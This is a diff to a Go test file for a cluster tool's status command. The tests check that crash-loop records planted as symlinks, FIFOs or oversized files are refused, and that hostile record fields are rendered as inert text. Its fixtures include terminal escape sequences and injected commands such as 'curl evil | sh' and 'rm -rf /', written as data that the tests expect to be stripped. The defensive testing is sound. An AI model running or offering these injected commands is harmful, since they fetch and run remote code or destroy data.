@@ -17,13 +17,18 @@ limitations under the License.
 package status
 
 import (
+	"bytes"
 	"encoding/json"
 	"errors"
 	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 	"time"
 
+	"golang.org/x/sys/unix"
+
+	"k3sm.io/k3sm/pkg/dataroot"
 	"k3sm.io/k3sm/pkg/executor"
 )
 
@@ -196,20 +201,22 @@ func TestApplyCrashLoopOnTheServerRow(t *testing.T) {
 	})
 }
 
-// The collector reads the record through the FS seam: a tripped record makes
-// the server row FAIL; a 0700 work dir a plain user cannot read leaves the row
-// alone and notes why.
+// The collector reads the record with the daemon's owned reader: a tripped
+// record makes the server row FAIL; a record a plain user cannot read leaves
+// the row alone and notes why.
 func TestCollectorServerRowReadsTheCrashRecord(t *testing.T) {
 	t.Parallel()
 	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
-	workDir := "/var/lib/k3sm/server"
-	path := executor.CrashLoopPath(workDir)
 	tripped := now.Add(-time.Minute)
 	rec := executor.CrashRecord{Crashes: []executor.Crash{{At: tripped, Component: "kine"}}, TrippedAt: &tripped}
 	b, _ := json.Marshal(rec)
 
 	t.Run("tripped record fails the row", func(t *testing.T) {
-		c := Collector{FS: fakeFS{contents: map[string][]byte{path: b}}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
+		workDir := t.TempDir()
+		if err := os.WriteFile(executor.CrashLoopPath(workDir), b, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
 		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
 		c.crashLoop(&row)
 		if row.Severity != SeverityFail || !strings.Contains(row.Detail, "kine") || !strings.Contains(row.Remedy, "--clear-crashloop") {
@@ -217,7 +224,14 @@ func TestCollectorServerRowReadsTheCrashRecord(t *testing.T) {
 		}
 	})
 	t.Run("unreadable record is noted, not judged", func(t *testing.T) {
-		c := Collector{FS: fakeFS{unreadable: map[string]bool{path: true}}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
+		if os.Geteuid() == 0 {
+			t.Skip("root reads a mode-0000 file")
+		}
+		workDir := t.TempDir()
+		if err := os.WriteFile(executor.CrashLoopPath(workDir), b, 0o000); err != nil {
+			t.Fatal(err)
+		}
+		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
 		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
 		c.crashLoop(&row)
 		if row.Severity != SeverityOK || !strings.Contains(row.Wide["crash-loop"], "not readable") {
@@ -225,7 +239,7 @@ func TestCollectorServerRowReadsTheCrashRecord(t *testing.T) {
 		}
 	})
 	t.Run("absent record changes nothing", func(t *testing.T) {
-		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
+		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: t.TempDir()}, Now: func() time.Time { return now }}
 		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
 		c.crashLoop(&row)
 		if row.Severity != SeverityOK || len(row.Wide) != 0 {
@@ -388,5 +402,353 @@ func TestCrashLoopBackingOffHasItsOwnWideValue(t *testing.T) {
 	}
 	if !strings.Contains(generic, "keeps failing") {
 		t.Errorf("the generic crash-loop alert changed: %q", generic)
+	}
+}
+
+// TestCrashRecordRowRefusesSymlinkFIFOAndOversize pins that status reads the
+// crash-loop record through the bounded, no-follow, regular-file-only reader.
+// The work dir is writable by the service user, so each planted shape is one a
+// plain os.ReadFile would honour: a symlink to a valid tripped record (followed,
+// FAIL), a FIFO (the open blocks, status hangs) and a valid tripped record
+// padded past executor.CrashRecordMaxBytes (parsed whole, FAIL). Each must
+// render as the unreadable note on an otherwise untouched row instead. A
+// normal record still renders, and a missing one is no record.
+func TestCrashRecordRowRefusesSymlinkFIFOAndOversize(t *testing.T) {
+	t.Parallel()
+	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
+	tripped := now.Add(-time.Minute)
+	rec := executor.CrashRecord{Crashes: []executor.Crash{{At: tripped, Component: "kine"}}, TrippedAt: &tripped}
+	valid, err := json.Marshal(rec)
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	// collect runs the read with a deadline, so a regression that blocks on
+	// the FIFO fails here instead of hanging the package.
+	collect := func(t *testing.T, workDir string) Row {
+		t.Helper()
+		c := Collector{FS: fakeFS{}, Paths: Paths{WorkDir: workDir}, Now: func() time.Time { return now }}
+		done := make(chan Row, 1)
+		go func() {
+			row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Wide: map[string]string{}}
+			c.crashLoop(&row)
+			done <- row
+		}()
+		select {
+		case row := <-done:
+			return row
+		case <-time.After(5 * time.Second):
+			t.Fatal("crash-loop read did not return within 5s (blocked on a planted FIFO?)")
+			return Row{}
+		}
+	}
+	assertUnreadable := func(t *testing.T, row Row) {
+		t.Helper()
+		if row.Severity != SeverityOK || row.State != StateRunning || row.Detail != "" || row.Remedy != "" {
+			t.Fatalf("a refused record judged the row: %+v", row)
+		}
+		if !strings.HasPrefix(row.Wide["crash-loop"], "crash-loop record unreadable") {
+			t.Fatalf("crash-loop note = %q, want the unreadable note", row.Wide["crash-loop"])
+		}
+	}
+
+	t.Run("symlink", func(t *testing.T) {
+		t.Parallel()
+		workDir := t.TempDir()
+		target := filepath.Join(t.TempDir(), "elsewhere.json")
+		if err := os.WriteFile(target, valid, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.Symlink(target, executor.CrashLoopPath(workDir)); err != nil {
+			t.Fatal(err)
+		}
+		assertUnreadable(t, collect(t, workDir))
+	})
+	t.Run("fifo", func(t *testing.T) {
+		t.Parallel()
+		workDir := t.TempDir()
+		if err := unix.Mkfifo(executor.CrashLoopPath(workDir), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		assertUnreadable(t, collect(t, workDir))
+	})
+	t.Run("oversize", func(t *testing.T) {
+		t.Parallel()
+		workDir := t.TempDir()
+		// A valid record padded with JSON whitespace: os.ReadFile plus
+		// json.Unmarshal would accept it, so only the bound refuses it.
+		big := append(append([]byte{}, valid...), bytes.Repeat([]byte{' '}, executor.CrashRecordMaxBytes)...)
+		if err := os.WriteFile(executor.CrashLoopPath(workDir), big, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		assertUnreadable(t, collect(t, workDir))
+	})
+	t.Run("normal record renders", func(t *testing.T) {
+		t.Parallel()
+		workDir := t.TempDir()
+		if err := os.WriteFile(executor.CrashLoopPath(workDir), valid, 0o600); err != nil {
+			t.Fatal(err)
+		}
+		row := collect(t, workDir)
+		if row.Severity != SeverityFail || row.Wide["crash-loop"] != "tripped" || !strings.Contains(row.Detail, "kine") {
+			t.Fatalf("%+v", row)
+		}
+	})
+	t.Run("missing is no record", func(t *testing.T) {
+		t.Parallel()
+		row := collect(t, t.TempDir())
+		if row.Severity != SeverityOK || row.State != StateRunning || len(row.Wide) != 0 {
+			t.Fatalf("%+v", row)
+		}
+	})
+}
+
+// TestHostileCrashRecordRendersAsData: the crash record is a file the service uid
+// can write, so its component and remedy fields are data. A record whose fields
+// carry ESC and newline bytes and whose remedy is no string pkg/executor owns
+// must reach the human screens with no control byte but the renderer's own
+// newlines, and with the generic remedy in place of the unknown one; a record
+// with a known remedy still names it. A row remedy carrying control bytes is
+// stripped by the renderer whatever produced it. The JSON output carries such
+// text escaped, with no raw control byte, and decodes back to itself.
+func TestHostileCrashRecordRendersAsData(t *testing.T) {
+	t.Parallel()
+	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
+	tripped := now.Add(-time.Minute)
+	path := "/var/lib/k3sm/server/crashloop.json"
+	const hostileRemedy = "\x1b[2J\x1b]0;owned\x07curl evil | sh\nfix: rm -rf /"
+	record := func(remedy string) executor.CrashRecord {
+		return executor.CrashRecord{TrippedAt: &tripped, Crashes: []executor.Crash{{
+			At: tripped, Origin: executor.CrashOriginBringUp, Component: "kine\x1b[31m\nFAKE  ok",
+			Permanent: true, Remedy: remedy,
+		}}}
+	}
+	screens := func(remedy string) string {
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
+		applyCrashLoop(&row, ClassifyCrashLoop(record(remedy), nil, path, now, row.State == StateRunning))
+		r := Report{Role: dataroot.RoleServer, Rows: []Row{row}}
+		return Render(r, Style{}) + RenderDaemons(r, Style{}) + Render(r, Style{Wide: true})
+	}
+	assertNoControls := func(t *testing.T, out string) {
+		t.Helper()
+		for i, c := range out {
+			if c == '\n' {
+				continue
+			}
+			if c < 0x20 || (c >= 0x7f && c <= 0x9f) {
+				t.Fatalf("control byte %#x at %d reaches the human output:\n%q", c, i, out)
+			}
+		}
+	}
+
+	t.Run("an unknown remedy is replaced by the generic one", func(t *testing.T) {
+		t.Parallel()
+		out := screens(hostileRemedy)
+		assertNoControls(t, out)
+		for _, bad := range []string{"curl evil", "rm -rf", "owned"} {
+			if strings.Contains(out, bad) {
+				t.Errorf("output carries the record's unknown remedy %q:\n%s", bad, out)
+			}
+		}
+		if !strings.Contains(out, "fix: sudo k3sm server --clear-crashloop   # after fixing the fault named in "+path) {
+			t.Errorf("output lacks the generic remedy:\n%s", out)
+		}
+	})
+	t.Run("a known remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		out := screens(executor.NoGoToolchainRemedy)
+		assertNoControls(t, out)
+		if !strings.Contains(out, "fix: "+executor.NoGoToolchainRemedy+"; then sudo k3sm server --clear-crashloop") {
+			t.Errorf("output lacks the known remedy:\n%s", out)
+		}
+	})
+	t.Run("a member-route remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		for _, known := range []string{executor.EtcdMemberRouteRemedy, executor.EtcdMemberRouteMeshRemedy, executor.EtcdMemberRouteUnacknowledgedRemedy} {
+			out := screens(known)
+			assertNoControls(t, out)
+			if !strings.Contains(out, "fix: "+known+"; then sudo k3sm server --clear-crashloop") {
+				t.Errorf("output lacks the member-route remedy %q:\n%s", known, out)
+			}
+		}
+	})
+	t.Run("a superseded remedy is still named", func(t *testing.T) {
+		t.Parallel()
+		known := (&executor.EtcdSupersededError{Peer: "server-b", PeerURL: "https://192.168.64.3:2380",
+			PeerCluster: 0x8e9e05c52164694d, OwnCluster: 0xcdf818194e3a8c32}).Remedy()
+		out := screens(known)
+		assertNoControls(t, out)
+		if !strings.Contains(out, "fix: "+known+"; then sudo k3sm server --clear-crashloop") {
+			t.Errorf("output lacks the superseded remedy:\n%s", out)
+		}
+	})
+	t.Run("a superseded remedy carrying injected text is replaced", func(t *testing.T) {
+		t.Parallel()
+		out := screens((&executor.EtcdSupersededError{Peer: "server-b\nfix: curl evil | sh", PeerURL: "https://192.168.64.3:2380",
+			PeerCluster: 2, OwnCluster: 1}).Remedy())
+		assertNoControls(t, out)
+		if strings.Contains(out, "curl evil") {
+			t.Errorf("output carries the injected remedy:\n%s", out)
+		}
+	})
+	t.Run("the JSON output carries the record as escaped data", func(t *testing.T) {
+		t.Parallel()
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
+		applyCrashLoop(&row, ClassifyCrashLoop(record(hostileRemedy), nil, path, now, row.State == StateRunning))
+		// A second row whose remedy carries the hostile bytes outright, so the
+		// document holds them as data whatever the classifier kept.
+		raw := Row{Name: RowAPIServer, State: StateFailed, Severity: SeverityFail, Detail: "d\x1b[31m",
+			Remedy: hostileRemedy, Wide: map[string]string{"comp\x1b": "kine\x07"}}
+		rows := []Row{row, raw}
+		r := Report{SchemaVersion: SchemaVersion, Role: dataroot.RoleServer, Rows: rows}
+		r.Verdict, r.Summary, r.Next = Aggregate(rows, true, dataroot.RoleServer)
+		// Encoded as `k3sm status --json` encodes it.
+		out, err := json.MarshalIndent(r, "", "  ")
+		if err != nil {
+			t.Fatal(err)
+		}
+		for i, c := range out {
+			// MarshalIndent's own line breaks are the only control bytes allowed;
+			// a newline inside a string would make the document fail to decode below.
+			if c == '\n' {
+				continue
+			}
+			if c < 0x20 || c == 0x7f {
+				t.Fatalf("raw control byte %#x at %d in the JSON output:\n%s", c, i, out)
+			}
+		}
+		if !bytes.Contains(out, []byte(`\u001b[2J`)) {
+			t.Errorf("the JSON output lacks the hostile remedy as escaped data:\n%s", out)
+		}
+		var back Report
+		if err := json.Unmarshal(out, &back); err != nil {
+			t.Fatalf("the JSON output does not decode: %v\n%s", err, out)
+		}
+		again, err := json.MarshalIndent(back, "", "  ")
+		if err != nil {
+			t.Fatal(err)
+		}
+		if !bytes.Equal(out, again) {
+			t.Errorf("the JSON output does not round-trip:\nfirst:\n%s\nsecond:\n%s", out, again)
+		}
+	})
+	t.Run("the detail view strips control bytes from wide values", func(t *testing.T) {
+		t.Parallel()
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "d",
+			Wide: map[string]string{"comp\x1b[31m": "kine\x1b[2J\tFAKE\nok  fine"}}
+		out := RenderDaemons(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
+		assertNoControls(t, out)
+		if !strings.Contains(out, "comp[31m") || !strings.Contains(out, "kine[2JFAKEok  fine") {
+			t.Errorf("output lacks the stripped wide row:\n%q", out)
+		}
+	})
+	t.Run("the renderer strips control bytes from every remedy step", func(t *testing.T) {
+		t.Parallel()
+		row := Row{Name: RowServer, State: StateCrashLoop, Severity: SeverityFail, Detail: "d",
+			Remedy: "first\x1b[2J step\nsecond\x07 step\r", Wide: map[string]string{}}
+		out := RenderDaemons(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
+		assertNoControls(t, out)
+		for _, want := range []string{"fix: first[2J step\n", "fix: second step\n"} {
+			if !strings.Contains(out, want) {
+				t.Errorf("output lacks %q:\n%q", want, out)
+			}
+		}
+	})
+}
+
+// TestHostileCrashRecordComponentShowsUnknown: the record's component is text
+// the service uid wrote, so a printable but hostile value, or one over 64
+// bytes, reaches no human screen on any posture (row detail, the daemons view,
+// the wide leader-lost note): the fixed word "unknown" stands in its place. A
+// real component name is still shown.
+func TestHostileCrashRecordComponentShowsUnknown(t *testing.T) {
+	t.Parallel()
+	now := time.Date(2026, 9, 9, 12, 0, 0, 0, time.UTC)
+	tripped := now.Add(-time.Minute)
+	path := "/var/lib/k3sm/server/crashloop.json"
+	entries := func(comp, origin string, n int) []executor.Crash {
+		var cs []executor.Crash
+		for i := n; i > 0; i-- {
+			cs = append(cs, executor.Crash{At: now.Add(-time.Duration(i) * 10 * time.Second), Component: comp, Origin: origin})
+		}
+		return cs
+	}
+	postures := map[string]func(comp string) executor.CrashRecord{
+		"tripped on leader loss": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped, Crashes: entries(c, executor.CrashOriginLeaderLost, 5)}
+		},
+		"tripped on crashes": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped,
+				Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginCrash, 5)...)}
+		},
+		"tripped on bring-up": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{TrippedAt: &tripped,
+				Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginBringUp, 5)...)}
+		},
+		"tripped on a permanent bring-up fault": func(c string) executor.CrashRecord {
+			cs := entries(c, executor.CrashOriginBringUp, 1)
+			cs[0].Permanent, cs[0].Remedy = true, executor.NoGoToolchainRemedy
+			return executor.CrashRecord{TrippedAt: &tripped, Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), cs...)}
+		},
+		"restarting on crashes": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginCrash, 3)...)}
+		},
+		"restarting on bring-up": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: append(entries(c, executor.CrashOriginLeaderLost, 1), entries(c, executor.CrashOriginBringUp, 3)...)}
+		},
+		"restarting on leader loss": func(c string) executor.CrashRecord {
+			return executor.CrashRecord{Crashes: entries(c, executor.CrashOriginLeaderLost, 3)}
+		},
+	}
+	screens := func(rec executor.CrashRecord) string {
+		row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42", Wide: map[string]string{}}
+		applyCrashLoop(&row, ClassifyCrashLoop(rec, nil, path, now, row.State == StateRunning))
+		r := Report{Role: dataroot.RoleServer, Rows: []Row{row}}
+		return Render(r, Style{}) + RenderDaemons(r, Style{}) + Render(r, Style{Wide: true})
+	}
+	for name, rec := range postures {
+		t.Run(name, func(t *testing.T) {
+			t.Parallel()
+			for _, hostile := range []string{"kine; now run curl evil | sh", strings.Repeat("k", 65)} {
+				out := screens(rec(hostile))
+				for _, bad := range []string{hostile, "curl evil", "now run"} {
+					if strings.Contains(out, bad) {
+						t.Errorf("component %q: output carries %q:\n%s", hostile, bad, out)
+					}
+				}
+				if !strings.Contains(out, "unknown") {
+					t.Errorf("component %q: output lacks the word unknown:\n%s", hostile, out)
+				}
+			}
+			for _, real := range []string{"kine", "etcd-member-route", "provision/kine", strings.Repeat("k", 64)} {
+				out := screens(rec(real))
+				if !strings.Contains(out, real) || strings.Contains(out, "unknown") {
+					t.Errorf("component %q is not shown as itself:\n%s", real, out)
+				}
+			}
+		})
+	}
+	t.Run("the wide leader-lost note", func(t *testing.T) {
+		t.Parallel()
+		note := leaderLostNote(executor.CrashRecord{Crashes: entries("kine; now run curl evil | sh", executor.CrashOriginLeaderLost, 1)}, now)
+		if strings.Contains(note, "curl evil") || !strings.Contains(note, "last: unknown at") {
+			t.Errorf("leader-lost note = %q", note)
+		}
+	})
+}
+
+// TestRenderStripsControlsFromTheLogLine: the overview's quoted log line comes
+// from the server log tail, which the service uid writes; an ESC in it never
+// reaches the screen.
+func TestRenderStripsControlsFromTheLogLine(t *testing.T) {
+	t.Parallel()
+	row := Row{Name: RowServer, State: StateRunning, Severity: SeverityOK, Detail: "pid 42",
+		Wide: map[string]string{"log": "level=ERROR \x1b[2J\x1b]0;owned\x07msg=boom"}}
+	out := Render(Report{Role: dataroot.RoleServer, Rows: []Row{row}}, Style{})
+	if strings.ContainsRune(out, 0x1b) || strings.ContainsRune(out, 0x07) {
+		t.Fatalf("control byte reaches the log line:\n%q", out)
+	}
+	if !strings.Contains(out, "log: level=ERROR [2J]0;ownedmsg=boom") {
+		t.Errorf("output lacks the stripped log line:\n%q", out)
 	}
 }
